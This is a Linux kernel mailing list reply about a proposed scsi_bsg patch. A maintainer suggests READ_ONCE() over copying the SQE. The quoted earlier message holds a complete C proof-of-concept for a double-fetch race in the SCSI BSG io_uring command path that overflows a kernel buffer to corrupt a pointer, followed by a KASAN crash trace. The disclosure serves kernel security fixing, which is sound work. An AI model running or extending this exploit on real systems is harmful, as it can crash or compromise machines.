Return-Path: <io-uring+bounces-13531-lists+io-uring=lfdr.de@vger.kernel.org>
Delivered-To: lists+io-uring@lfdr.de
Received: from mail.lfdr.de
	by lfdr with LMTP
	id KM2aLokbF2ov4gcAu9opvQ
	(envelope-from <io-uring+bounces-13531-lists+io-uring=lfdr.de@vger.kernel.org>)
	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:27:53 +0200
X-Original-To: lists+io-uring@lfdr.de
Received: from tor.lore.kernel.org (tor.lore.kernel.org [172.105.105.114])
	by mail.lfdr.de (Postfix) with ESMTPS id 38E055E7C25
	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 18:27:53 +0200 (CEST)
Received: from smtp.subspace.kernel.org (conduit.subspace.kernel.org [100.90.174.1])
	by tor.lore.kernel.org (Postfix) with ESMTP id CC1FA30269CC
	for <lists+io-uring@lfdr.de>; Wed, 27 May 2026 16:27:23 +0000 (UTC)
Received: from localhost.localdomain (localhost.localdomain [127.0.0.1])
	by smtp.subspace.kernel.org (Postfix) with ESMTP id B988F4279F6;
	Wed, 27 May 2026 16:27:22 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=purestorage.com header.i=@purestorage.com header.b="X6yygW26"
X-Original-To: io-uring@vger.kernel.org
Received: from mail-ot1-f50.google.com (mail-ot1-f50.google.com [209.85.210.50])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id ACB1E3C3C0B
	for <io-uring@vger.kernel.org>; Wed, 27 May 2026 16:27:20 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=pass smtp.client-ip=209.85.210.50
ARC-Seal:i=2; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1779899242; cv=pass; b=pB1PvKDRvGea/ybrui3qs4xEen7JGcIrJc4zYO/56HL5Uj0ngMJvhmHhQOkyrOsnNJ4xc2VsqDvBj2tr8ZX+SfrzIzdov+nU+34wdxYw7P+2EuHQFt/nBMkYYmWvRO3D3M33ACFtULWQxoZyKdkPz9nVxjUNzCebbvB2ru1cqMg=
ARC-Message-Signature:i=2; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1779899242; c=relaxed/simple;
	bh=E1rX4+tVYnECZbVl8/ATw8r6+/nl7Kc7IvRKx08D6yM=;
	h=MIME-Version:References:In-Reply-To:From:Date:Message-ID:Subject:
	 To:Cc:Content-Type; b=idrT3g/SDFNlMVzpghvrmUbijZzYtTxhYSTYGl8k57Am5E9rrUhx612zciWPCuT+B4bmrZrAuQ+T9StXp36YBpm3oOra1YMCv01yVLejyRG6xm8gtzJW+uiGucCCs96d2T5Yf99NvoRz7s/DzNXJMUHkJwbFHAJNPrMN11ThYzo=
ARC-Authentication-Results:i=2; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=purestorage.com; spf=pass smtp.mailfrom=purestorage.com; dkim=pass (2048-bit key) header.d=purestorage.com header.i=@purestorage.com header.b=X6yygW26; arc=pass smtp.client-ip=209.85.210.50
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=purestorage.com
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=purestorage.com
Received: by mail-ot1-f50.google.com with SMTP id 46e09a7af769-7e6170e33bcso954947a34.3
        for <io-uring@vger.kernel.org>; Wed, 27 May 2026 09:27:20 -0700 (PDT)
ARC-Seal: i=1; a=rsa-sha256; t=1779899239; cv=none;
        d=google.com; s=arc-20240605;
        b=Vf4CMhjR5sofxdRO6A6AdEjDRft4WQHX3ZFfUTj91WUIQbC+FK+PCdNEU3FaaA3k6A
         tjjHSGae7ptYROGb/EUDQEhHz8DHXQoFECo7Wzr/gVA90tF+4jgzNnVsdfNFheaSzdgg
         aDXQ4qOm5EFxmFCyd3wc2S0dJcMzQJy8dnVSH7jj68kpL69IdAvPmnEuct1+ouLBBYvY
         M6t/q0YT6abM/AsZ7cAtPWbDuG+dTwwhZKkD68aaRi6xV6L06GvEDWJQmaptBM4y6+OL
         lX8a0gFejpmgIDHBXdSn5JnWtVjOLUABTtgAlhEliIx7z5FuIE7Z2rvLuLqdjVADP88i
         e/JA==
ARC-Message-Signature: i=1; a=rsa-sha256; c=relaxed/relaxed; d=google.com; s=arc-20240605;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:dkim-signature;
        bh=0B70i3Uum3xA42USoC4XIXAmwm/Myb2swVPuUExaAdI=;
        fh=fPRsoEhIxKfR8nMieJj6QgAGxj2h42gShYR+oMRtvBU=;
        b=UWH2INE3ldqv/4ELqBkaJ3c6nNi1xCVe/nPciGqkODej83ssS6rxbYOWGMLHdA+FIK
         /A700809zAgnENGH8vyZa6Hd1ZkoDyxkWXmnHBcA/XKTpdnPMcg1xnEfuF4Wjxl0zvmi
         kKjWJF2RGXImg1uFSPYnCIcL0ujcH6ci+26dZMocLXh0j9il9H/cEyJanfvq4Wbd41hR
         GSjOE0SDLggBJYvllQ4E0Vz+jL2Yl6CGfgzRfzOKJHTnTiJ+GIcLI9HtkLj3bfudFWKo
         ZwdY1QPeW2gMHijfo7HmxI8acy9iTNo1ZXoyj9KbKUMBc3AeclKfEnXvADP8ogAZ8Htu
         E5BA==;
        darn=vger.kernel.org
ARC-Authentication-Results: i=1; mx.google.com; arc=none
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=purestorage.com; s=google2022; t=1779899239; x=1780504039; darn=vger.kernel.org;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:from:to:cc:subject:date
         :message-id:reply-to;
        bh=0B70i3Uum3xA42USoC4XIXAmwm/Myb2swVPuUExaAdI=;
        b=X6yygW26VD9O5wfsXjn7U+e5TUfTScBbsty/kC0AtRDS0bRYxzXBjktxTtHy6xEvg8
         vxOqTSBEfyF/mnqjKQEbf+MwsTl5NgopNCui3dBCrgbbHy/HBADltWGRYsmDLjE3RqkY
         f6YOJFKuv82PYrVkscCfKD6q7q4NHrPj+iGVQ5S6XHeM/QJs0QF38FHc6neuf60qe8s2
         BZzjpNwmlk2PfW19q6Qv5l+tuEGT1HPN3JbDKcWzR4O3zTxUreJyFNv6ArW1knAfIPyu
         epOCYK9TA0OJdUm9XQwesA9Rp2RqR9YyXG46YkRSXYSC2hkNJrboJe27aYUIQWxkR2HS
         Lyjg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1779899239; x=1780504039;
        h=content-transfer-encoding:cc:to:subject:message-id:date:from
         :in-reply-to:references:mime-version:x-gm-gg:x-gm-message-state:from
         :to:cc:subject:date:message-id:reply-to;
        bh=0B70i3Uum3xA42USoC4XIXAmwm/Myb2swVPuUExaAdI=;
        b=ZmxHgQRVzYl7hSQAmvE9LzDs2Uo/nayt0L4e+rZMNoZyJsToABaHzvk/WkMlVq6uNr
         GGBvnxhaPzvKQ9gU2ZuMfM5GBEL6whXBWAd+WontV+QVq50QTzguLI+uRoWecOgORWCj
         2Dt4PCJhYUntX+BDfJqmAYZ5LtHvAzGIY9u2Oua1lMJsemheENPUeFV8fl0FNQe+0UBS
         SeDhFfrUwN1XKIQKAF3Sx0SFfo2r6CIhaixPnB7vEJGrdsdo4pQJFN2C8uUD1iXRgITC
         mUwzwzqBbtJv5F4r8CNx7iocsYnzyR3TpQBNrZqqrVR5//drrNwIMoSclI4CnV2SETz2
         jo9g==
X-Forwarded-Encrypted: i=1; AFNElJ8vSEKU4L4AUczP5KCtxmo8DxW0FnnL5q7oIkQGNBmBVWYayRj06bpitcQg3EysIWoiif6HVldqhw==@vger.kernel.org
X-Gm-Message-State: AOJu0Yyv6Ys5nukVq34xYofhrWcUFtJ01Bpi5wMHvq2vGcIyhwxQazBA
	xrs3sHVi/XSZ39N/5xY415B6S2ujdfN+QZBw2TQrFXm3QhiwZwEtrKvnijidrAQu1HvSY1NAmA4
	r5MdmpsR1NB7R9SkYi1IP+1+ZlThKwe2dqpFb9ZGw+P/fkWSrumxiEx90Aw==
X-Gm-Gg: Acq92OGSS1U+tlG6cxKow3ayoXCcXgx0igJTSptzWeVxClb+9ldkkoSW5OfTvRE4PnD
	TC/fUgpo8SH2UgBKJLoYxaDv8FqNCNeboNlcw6Lz+0ujE2nRG9h9ix+hrbeIl1waFvuV0mxBrpC
	L2lh+o1alQVZc/d+VCND43L5pId19WJX3DeE2KLMPWmr6XDaCQMAZdJDJywpnMtBJeqmkPJvP4e
	uCkxz/D+6S+rIr2Wq817paLgDlxJyxouJsLGF/Lw7gvce2pNbhLrwTLZBqDyxenbOf9TZpjnTvU
	3XsCEuS/
X-Received: by 2002:a05:6808:30a7:b0:485:5374:c67a with SMTP id
 5614622812f47-4855374ca96mr7748388b6e.7.1779899239444; Wed, 27 May 2026
 09:27:19 -0700 (PDT)
Precedence: bulk
X-Mailing-List: io-uring@vger.kernel.org
List-Id: <io-uring.vger.kernel.org>
List-Subscribe: <mailto:io-uring+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:io-uring+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
References: <20260527105931.3950913-1-rc@rexion.ai> <ee931505-64a2-411d-8607-3db8912b70c4@kernel.dk>
 <20260527161926.4071110-1-rc@rexion.ai>
In-Reply-To: <20260527161926.4071110-1-rc@rexion.ai>
From: Caleb Sander Mateos <csander@purestorage.com>
Date: Wed, 27 May 2026 09:27:08 -0700
X-Gm-Features: AVHnY4JGEq2wd_nISfUxRsatHFcKmy6bX-tx2wTu-y75sqVd8yj1674xYU6_PQI
Message-ID: <CADUfDZr6LJckoVt2NRfRt3Njs-WAqsg5-QnTDi6xbUDiO950Fw@mail.gmail.com>
Subject: Re: [PATCH] scsi: bsg: copy uring_cmd payload to prevent double-fetch
 from shared SQE
To: Rahul Chandelkar <rc@rexion.ai>
Cc: axboe@kernel.dk, James.Bottomley@hansenpartnership.com, 
	martin.petersen@oracle.com, fujita.tomonori@lab.ntt.co.jp, 
	linux-scsi@vger.kernel.org, linux-block@vger.kernel.org, 
	io-uring@vger.kernel.org
Content-Type: text/plain; charset="UTF-8"
Content-Transfer-Encoding: quoted-printable
X-Spamd-Result: default: False [-2.16 / 15.00];
	ARC_ALLOW(-1.00)[subspace.kernel.org:s=arc-20240116:i=2];
	DMARC_POLICY_ALLOW(-0.50)[purestorage.com,quarantine];
	R_SPF_ALLOW(-0.20)[+ip4:172.105.105.114:c];
	R_DKIM_ALLOW(-0.20)[purestorage.com:s=google2022];
	MAILLIST(-0.15)[generic];
	MIME_GOOD(-0.10)[text/plain];
	HAS_LIST_UNSUB(-0.01)[];
	TAGGED_FROM(0.00)[bounces-13531-lists,io-uring=lfdr.de];
	FROM_HAS_DN(0.00)[];
	RCVD_COUNT_THREE(0.00)[4];
	FORGED_SENDER_MAILLIST(0.00)[];
	RCVD_TLS_LAST(0.00)[];
	MIME_TRACE(0.00)[0:+];
	DKIM_TRACE(0.00)[purestorage.com:+];
	ASN(0.00)[asn:63949, ipnet:172.105.96.0/20, country:SG];
	MISSING_XM_UA(0.00)[];
	PRECEDENCE_BULK(0.00)[];
	FROM_NEQ_ENVFROM(0.00)[csander@purestorage.com,io-uring@vger.kernel.org];
	FORGED_RECIPIENTS_MAILLIST(0.00)[];
	NEURAL_HAM(-0.00)[-1.000];
	TAGGED_RCPT(0.00)[io-uring];
	RCPT_COUNT_SEVEN(0.00)[8];
	TO_DN_SOME(0.00)[];
	DBL_BLOCKED_OPENRESOLVER(0.00)[rctx.target:url,rexion.ai:email,purestorage.com:dkim,mail.gmail.com:mid,tor.lore.kernel.org:rdns,tor.lore.kernel.org:helo]
X-Rspamd-Queue-Id: 38E055E7C25
X-Rspamd-Action: no action
X-Rspamd-Server: lfdr

On Wed, May 27, 2026 at 9:19=E2=80=AFAM Rahul Chandelkar <rc@rexion.ai> wro=
te:
>
> On Wed, May 27, 2026 at 10:06:44AM -0600, Jens Axboe wrote:
> > I don't think this is the right way to fix it, ->sqe should've been
> > stable upfront if this ends up happening. Can you share your poc with
> > me? Your trace has been trimmed down way too much to be useful.
>
> Agreed that a core-level copy before the inline callback would be the
> right fix and would eliminate the entire class for every uring_cmd
> driver. The per-driver copy was meant as a minimal backportable fix
> for the immediate scsi_bsg path.
>
> PoC and full trace below.
>
> --- PoC (poc_bsg_toctou.c) ---
>
> Build:  gcc -O2 -pthread -static -o poc poc_bsg_toctou.c
> Usage:  ./poc /dev/bsg/X
> Needs:  2+ CPUs, io_uring, /dev/bsg/* access
>
> The racer thread flips request_len between 16 (passes the <=3D32 bounds
> check) and 128 (used by copy_from_user, overflows scmd->cmnd[32]).
> The overflow payload plants 0xdead000000001000 at the sense_buffer
> pointer offset (+84 from cmnd[0]). When scsi_queue_rq() does
> memset(scmd->sense_buffer, 0, SCSI_SENSE_BUFFERSIZE) it faults on the
> corrupted pointer.

Then the fix is to use READ_ONCE() to access the SQE fields, right?
Copying the entire SQE seems like unnecessary overhead. See
nvme_uring_cmd_io() for prior art.

Best,
Caleb

>
> Tested on v7.1-rc1, KASAN, QEMU virtio-scsi, 2 vCPUs.
>
> /*
>  * PoC: SCSI BSG uring_cmd TOCTOU heap buffer overflow
>  *
>  * Overflows scmd->cmnd[32] to corrupt sense_buffer pointer.
>  * On successful race, memset(corrupted_sense_buffer, 0, 96) in
>  * scsi_queue_rq() causes a kernel fault proving the vulnerability.
>  *
>  * Usage: ./poc /dev/bsg/X
>  * Build: gcc -O2 -pthread -static -o poc poc_bsg_toctou.c
>  */
>
> #define _GNU_SOURCE
> #include <stdio.h>
> #include <stdlib.h>
> #include <string.h>
> #include <unistd.h>
> #include <fcntl.h>
> #include <pthread.h>
> #include <sched.h>
> #include <stdatomic.h>
> #include <stdint.h>
> #include <sys/mman.h>
> #include <sys/syscall.h>
> #include <linux/io_uring.h>
>
> struct bsg_uring_cmd {
>         uint64_t request;
>         uint32_t request_len;
>         uint32_t protocol;
>         uint32_t subprotocol;
>         uint32_t max_response_len;
>         uint64_t response;
>         uint64_t dout_xferp;
>         uint32_t dout_xfer_len;
>         uint32_t dout_iovec_count;
>         uint64_t din_xferp;
>         uint32_t din_xfer_len;
>         uint32_t din_iovec_count;
>         uint32_t timeout_ms;
>         uint8_t  reserved[12];
> };
>
> #define QUEUE_DEPTH   4
> #define OVERFLOW_LEN  128
> #define SAFE_LEN      16
>
> static atomic_int stop_flag =3D 0;
>
> static int sys_io_uring_setup(unsigned entries, struct io_uring_params *p=
)
> {
>         return syscall(__NR_io_uring_setup, entries, p);
> }
>
> static int sys_io_uring_enter(int fd, unsigned to_submit,
>                               unsigned min_complete, unsigned flags)
> {
>         return syscall(__NR_io_uring_enter, fd, to_submit, min_complete,
>                        flags, NULL, 0);
> }
>
> struct race_ctx {
>         volatile uint32_t *target;
>         int cpu;
> };
>
> static void *racer_thread(void *arg)
> {
>         struct race_ctx *ctx =3D arg;
>         cpu_set_t cpuset;
>
>         CPU_ZERO(&cpuset);
>         CPU_SET(ctx->cpu, &cpuset);
>         sched_setaffinity(0, sizeof(cpuset), &cpuset);
>
>         while (!atomic_load_explicit(&stop_flag, memory_order_relaxed)) {
>                 *ctx->target =3D OVERFLOW_LEN;
>                 *ctx->target =3D OVERFLOW_LEN;
>                 *ctx->target =3D OVERFLOW_LEN;
>                 *ctx->target =3D OVERFLOW_LEN;
>         }
>         return NULL;
> }
>
> int main(int argc, char **argv)
> {
>         struct io_uring_params params;
>         int ring_fd, bsg_fd;
>         void *sq_ring, *cq_ring, *sqe_ring;
>         unsigned *sq_head, *sq_tail, *sq_mask, *sq_array;
>         unsigned *cq_head, *cq_tail, *cq_mask;
>         size_t sqe_stride;
>         pthread_t racer;
>         struct race_ctx rctx;
>         int i, attempts =3D 0;
>         int max_attempts =3D 500000;
>
>         if (argc < 2) {
>                 fprintf(stderr, "Usage: %s /dev/bsg/X\n", argv[0]);
>                 return 1;
>         }
>
>         bsg_fd =3D open(argv[1], O_RDWR);
>         if (bsg_fd < 0) {
>                 perror("open bsg");
>                 return 1;
>         }
>
>         cpu_set_t cpuset;
>         CPU_ZERO(&cpuset);
>         CPU_SET(0, &cpuset);
>         sched_setaffinity(0, sizeof(cpuset), &cpuset);
>
>         memset(&params, 0, sizeof(params));
>         params.flags =3D IORING_SETUP_SQE128 | IORING_SETUP_CQE32;
>
>         ring_fd =3D sys_io_uring_setup(QUEUE_DEPTH, &params);
>         if (ring_fd < 0) {
>                 perror("io_uring_setup");
>                 return 1;
>         }
>
>         size_t sq_ring_sz =3D params.sq_off.array +
>                             params.sq_entries * sizeof(unsigned);
>         sq_ring =3D mmap(NULL, sq_ring_sz, PROT_READ | PROT_WRITE,
>                        MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_SQ_=
RING);
>
>         sq_head  =3D sq_ring + params.sq_off.head;
>         sq_tail  =3D sq_ring + params.sq_off.tail;
>         sq_mask  =3D sq_ring + params.sq_off.ring_mask;
>         sq_array =3D sq_ring + params.sq_off.array;
>
>         sqe_stride =3D 2 * sizeof(struct io_uring_sqe);
>         sqe_ring =3D mmap(NULL, params.sq_entries * sqe_stride,
>                         PROT_READ | PROT_WRITE, MAP_SHARED | MAP_POPULATE=
,
>                         ring_fd, IORING_OFF_SQES);
>
>         size_t cqe_size =3D sizeof(struct io_uring_cqe) + 16;
>         size_t cq_ring_sz =3D params.cq_off.cqes +
>                             params.cq_entries * cqe_size;
>         cq_ring =3D mmap(NULL, cq_ring_sz, PROT_READ | PROT_WRITE,
>                        MAP_SHARED | MAP_POPULATE, ring_fd, IORING_OFF_CQ_=
RING);
>
>         cq_head =3D cq_ring + params.cq_off.head;
>         cq_tail =3D cq_ring + params.cq_off.tail;
>         cq_mask =3D cq_ring + params.cq_off.ring_mask;
>
>         unsigned char payload[OVERFLOW_LEN];
>         memset(payload, 0x41, sizeof(payload));
>         payload[0] =3D 0x12; /* INQUIRY opcode */
>
>         uint64_t bad_sense =3D 0xdead000000001000ULL;
>         memcpy(payload + 84, &bad_sense, 8);
>
>         printf("[*] SCSI BSG uring_cmd TOCTOU PoC\n");
>         printf("[*] Target: %s\n", argv[1]);
>         printf("[*] Overflow: %d -> %d bytes (sense_buffer at +84)\n",
>                SAFE_LEN, OVERFLOW_LEN);
>         printf("[*] Bad sense_buffer: 0x%lx\n", (unsigned long)bad_sense)=
;
>
>         rctx.cpu =3D 1;
>
>         while (attempts < max_attempts) {
>                 unsigned tail =3D *sq_tail;
>                 unsigned idx =3D tail & *sq_mask;
>
>                 struct io_uring_sqe *sqe =3D
>                         (struct io_uring_sqe *)((char *)sqe_ring +
>                                                 idx * sqe_stride);
>                 memset(sqe, 0, sqe_stride);
>
>                 sqe->opcode =3D IORING_OP_URING_CMD;
>                 sqe->fd =3D bsg_fd;
>
>                 struct bsg_uring_cmd *cmd =3D
>                         (struct bsg_uring_cmd *)((char *)sqe + 48);
>
>                 cmd->request     =3D (uint64_t)(unsigned long)payload;
>                 cmd->request_len =3D SAFE_LEN;
>                 cmd->protocol    =3D 0;
>                 cmd->subprotocol =3D 0;
>                 cmd->max_response_len =3D 96;
>                 cmd->timeout_ms  =3D 1000;
>
>                 rctx.target =3D &cmd->request_len;
>
>                 if (attempts =3D=3D 0) {
>                         pthread_create(&racer, NULL, racer_thread, &rctx)=
;
>                         usleep(1000);
>                 }
>
>                 sq_array[idx] =3D idx;
>
>                 cmd->request_len =3D SAFE_LEN;
>                 __atomic_store_n(sq_tail, tail + 1, __ATOMIC_RELEASE);
>
>                 sys_io_uring_enter(ring_fd, 1, 1, IORING_ENTER_GETEVENTS)=
;
>
>                 while (*cq_head !=3D *cq_tail)
>                         __atomic_store_n(cq_head, *cq_head + 1,
>                                          __ATOMIC_RELEASE);
>
>                 attempts++;
>                 if (attempts % 50000 =3D=3D 0)
>                         printf("[*] %d attempts...\n", attempts);
>         }
>
>         atomic_store(&stop_flag, 1);
>         pthread_join(racer, NULL);
>
>         printf("[!] %d attempts done. Check dmesg for crash.\n", attempts=
);
>
>         close(bsg_fd);
>         close(ring_fd);
>         return 0;
> }
>
> --- Full KASAN trace (untruncated) ---
>
> [    4.784469] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
> [    4.784815] BUG: KASAN: wild-memory-access in scsi_queue_rq+0x4a3/0x58=
a0
> [    4.785140] Write of size 96 at addr dead000000001000 by task poc/67
> [    4.785443]
> [    4.785529] CPU: 0 UID: 0 PID: 67 Comm: poc Not tainted 7.1.0-rc1 #2 P=
REEMPT(lazy)
> [    4.785532] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arc=
h_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
> [    4.785534] Call Trace:
> [    4.785536]  <TASK>
> [    4.785537]  dump_stack_lvl+0x53/0x70
> [    4.785540]  kasan_report+0xce/0x100
> [    4.785543]  ? scsi_queue_rq+0x4a3/0x58a0
> [    4.785546]  kasan_check_range+0x105/0x1b0
> [    4.785549]  __asan_memset+0x23/0x50
> [    4.785550]  scsi_queue_rq+0x4a3/0x58a0
> [    4.785553]  ? __pfx_scsi_queue_rq+0x10/0x10
> [    4.785556]  ? scsi_mq_get_budget+0xa8/0x670
> [    4.785558]  blk_mq_dispatch_rq_list+0x462/0x42b0
> [    4.785561]  ? blk_mq_rq_ctx_init+0x57a/0xcc0
> [    4.785564]  ? __pfx_blk_mq_dispatch_rq_list+0x10/0x10
> [    4.785566]  ? __pfx__raw_spin_lock+0x10/0x10
> [    4.785569]  __blk_mq_sched_dispatch_requests+0x2e2/0x23a0
> [    4.785574]  ? __pfx___blk_mq_sched_dispatch_requests+0x10/0x10
> [    4.785580]  ? blk_mq_insert_request+0x402/0x13f0
> [    4.785582]  blk_mq_sched_dispatch_requests+0xec/0x270
> [    4.785584]  blk_mq_run_hw_queue+0x797/0x10e0
> [    4.785586]  scsi_bsg_uring_cmd+0x942/0x1570
> [    4.785588]  ? __pfx_scsi_bsg_uring_cmd+0x10/0x10
> [    4.785594]  io_uring_cmd+0x2f6/0x950
> [    4.785599]  __io_issue_sqe+0xb6/0xcc0
> [    4.785601]  io_issue_sqe+0xe5/0x22d0
> [    4.785606]  ? io_uring_cmd_prep+0x619/0xa10
> [    4.785609]  io_submit_sqes+0xb4a/0x4540
> [    4.785614]  __do_sys_io_uring_enter+0x148c/0x2f50
> [    4.785618]  do_syscall_64+0xf9/0x540
> [    4.785621]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
>
> Second fault (completion path reading corrupted sense_buffer):
>
> [    4.799563] KASAN: maybe wild-memory-access in range [0xdead0000000010=
00-0xdead000000001007]
> [    4.800411] RIP: 0010:scsi_normalize_sense+0x47/0x480
> [    4.803461] R12: dead000000001000
> [    4.841254] Kernel panic - not syncing: Fatal exception in interrupt
>
> R12 holds the corrupted sense_buffer pointer (0xdead000000001000),
> confirming the overflow overwrote sense_buffer at the expected offset.
>
> The io_submit_sqes -> io_issue_sqe -> io_uring_cmd -> scsi_bsg_uring_cmd
> path shows this is the inline execution path where the SQE has not been
> copied to kernel memory yet.
>
> Rahul
>

